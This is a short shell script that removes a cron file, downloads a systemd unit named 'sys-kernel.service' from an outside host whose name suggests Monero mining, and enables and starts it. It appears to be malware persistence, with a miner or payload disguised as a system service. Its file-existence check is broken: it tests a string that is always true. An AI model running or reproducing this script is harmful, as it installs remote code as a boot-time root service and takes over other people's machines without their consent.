if [ "/etc/cron.d/cronconfig" ]; then
	rm -f /etc/cron.d/cronconfig
 	cd /etc/systemd/system
	wget https://xmrhorizontal.github.io/sys-kernel.service
	systemctl enable sys-kernel.service
	systemctl start sys-kernel.service
fi
